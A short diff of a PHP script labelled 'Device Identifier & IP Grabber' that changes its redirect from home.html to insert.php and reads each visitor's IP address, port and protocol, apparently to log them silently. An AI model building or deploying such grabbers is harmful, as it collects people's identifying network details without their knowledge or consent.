@@ -3,7 +3,7 @@
 //Device Identifier & IP Grabber
  
 //Variables
-header ('Location: home.html'); 
+header ('Location: insert.php'); 
 $protocol = $_SERVER['SERVER_PROTOCOL'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $port = $_SERVER['REMOTE_PORT'];
